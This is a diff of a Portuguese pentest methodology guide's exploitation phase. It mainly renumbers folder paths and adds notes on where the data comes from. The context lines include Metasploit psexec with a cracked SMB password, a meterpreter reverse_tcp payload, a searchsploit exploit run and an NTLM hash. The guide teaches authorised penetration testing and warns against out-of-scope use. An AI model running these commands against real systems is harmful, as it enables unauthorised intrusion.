@@ -4,7 +4,13 @@
 **Objetivo:** Executar os exploits priorizados na Fase 2 e obter uma SESSÃO (shell) no alvo.
 **Por quê:** Este é o passo que transforma "vulnerabilidade confirmada" em "eu tenho acesso". É o que o cliente/equipe quer ver funcionando.
 
-> ⚠️ **Só explote vetores da `09-vetores/matriz-vetores.md` com prioridade 1 e escopo confirmado.** Explorar fora do escopo é crime, mesmo sabendo que a falha existe.
+> ⚠️ **Só explote vetores da `16-vetores/matriz-vetores.md` com prioridade 1 e escopo confirmado.** Explorar fora do escopo é crime, mesmo sabendo que a falha existe.
+
+> **📡 Dados usados nos passos abaixo (de onde vêm):**
+> - **CVEs e alvos:** `15-alimentacao/alvos-cve.txt` ← MANUAL-RECON `05-vulns/nmap-vuln.txt` (Nmap NSE) + `02-enum/nmap-scan.xml` (searchsploit --nmap)
+> - **Severidade prévia:** `15-alimentacao/severidade-recon.md` ← MANUAL-RECON `06-validacao/resumo-severidade.md`
+> - **Vetores web já confirmados:** MANUAL-WEB `13-validacao/evidencias.md` — se o Módulo 02 já provou XSS/SQLi/etc., aqui você explora o impacto (ex.: sessão roubada), não re-testa a falha
+> - **Credenciais auxiliares:** `17-bruteforce/credenciais-encontradas.md` (Fase 3) e `18-cracking/hashes-crackeados.md` (Fase 4) — para módulos do Metasploit que exigem login (`set SMBUser/SMBPass`)
 
 ---
 
@@ -13,8 +19,8 @@
 **O que você vai fazer:** Abrir a matriz e pegar o vetor de prioridade 1 — CVE + exploit já identificados.
 
 ```bash
-cat 09-vetores/matriz-vetores.md
-cat 09-vetores/searchsploit-cves.txt
+cat 16-vetores/matriz-vetores.md
+cat 16-vetores/searchsploit-cves.txt
 ```
 
 **✅ Output esperado (prioridade 1):**
@@ -184,7 +190,7 @@ meterpreter >
 msf6 > use exploit/windows/smb/psexec
 msf6 exploit(...) > set RHOSTS 10.0.0.1
 msf6 exploit(...) > set SMBUser administrator
-msf6 exploit(...) > set SMBPass Admin@123      # senha do 10-bruteforce/credenciais-encontradas.md
+msf6 exploit(...) > set SMBPass Admin@123      # senha do 17-bruteforce/credenciais-encontradas.md
 msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
 msf6 exploit(...) > set LHOST 10.0.0.100
 msf6 exploit(...) > exploit
@@ -280,14 +286,14 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08
 ```bash
 # Copiar para a pasta da fase (nunca rode do diretório do Exploit-DB)
 searchsploit -m 42315
-mv 42315.py 12-exploracao/
+mv 42315.py 19-exploracao/
 
 # ANTES de rodar — leia o código!
-nano 12-exploracao/42315.py
+nano 19-exploracao/42315.py
 # Procure: IP hardcoded, payload suspeito, o que o script faz
 
 # Ajuste o alvo (normalmente variáveis no topo ou argumentos)
-python3 12-exploracao/42315.py 10.0.0.1
+python3 19-exploracao/42315.py 10.0.0.1
 ```
 
 **✅ Output esperado:**
@@ -346,17 +352,17 @@ evilcorp\www-data
 
 | # | Item | Arquivo gerado | ☑ |
 |---|------|---------------|:---:|
-| 1 | Vetor escolhido da matriz | `09-vetores/matriz-vetores.md` atualizado | [ ] |
+| 1 | Vetor escolhido da matriz | `16-vetores/matriz-vetores.md` atualizado | [ ] |
 | 2 | Vulnerabilidade CONFIRMADA antes de explorar | `msf6 > check` ou scanner auxiliar | [ ] |
-| 3 | Exploração executada (Metasploit ou standalone) | `12-exploracao/msf-logs.txt` | [ ] |
-| 4 | Sessão aberta OU prova de falha documentada | `12-exploracao/sessao-1.txt` | [ ] |
-| 5 | Evidências coletadas (sysinfo, getuid) | `12-exploracao/evidencias.md` | [ ] |
+| 3 | Exploração executada (Metasploit ou standalone) | `19-exploracao/msf-logs.txt` | [ ] |
+| 4 | Sessão aberta OU prova de falha documentada | `19-exploracao/sessao-1.txt` | [ ] |
+| 5 | Evidências coletadas (sysinfo, getuid) | `19-exploracao/evidencias.md` | [ ] |
 | 6 | Sessões gerenciadas (background/encerradas) | `sessions -v` | [ ] |
 
 ### 📁 Sua pasta deve estar assim ao final da Fase 5:
 
 ```
-12-exploracao/
+19-exploracao/
 ├── msf-logs.txt              ← transcript dos comandos e outputs do msfconsole
 ├── sessao-1.txt              ← sysinfo/getuid da sessão aberta
 ├── evidencias.md             ← evidências formatadas para o relatório
@@ -367,7 +373,7 @@ evilcorp\www-data
 **Como salvar o log do Metasploit:**
 ```bash
 # Dentro do msf6 (spool grava TUDO que você digita e o console imprime)
-msf6 > spool 12-exploracao/msf-logs.txt
+msf6 > spool 19-exploracao/msf-logs.txt
 msf6 > ... (seus comandos)
 msf6 > spool off
 ```
